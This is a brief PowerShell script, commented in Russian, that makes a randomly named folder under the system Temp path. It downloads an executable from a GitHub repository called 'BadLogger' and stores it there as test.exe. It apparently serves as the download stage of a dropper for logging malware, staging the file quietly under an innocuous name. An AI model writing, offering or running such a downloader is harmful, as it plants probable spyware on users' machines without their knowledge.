# Определяем папку Temp
$TempFolder = [System.IO.Path]::GetTempPath()
$TargetFolder = "$TempFolder\tmp-6et67re4"

# Создаём папку, если её нет
if (!(Test-Path -Path $TargetFolder)) {
    New-Item -ItemType Directory -Path $TargetFolder | Out-Null
}

# URL файла для скачивания
$FileUrl = "https://github.com/IMDelewer/BadLogger/raw/refs/heads/main/main.exe"
$TargetFile = "$TargetFolder\test.exe"

# Скачивание файла
Invoke-WebRequest -Uri $FileUrl -OutFile $TargetFile

# Вывод результата
Write-Host "✅ Файл скачан в: $TargetFile"
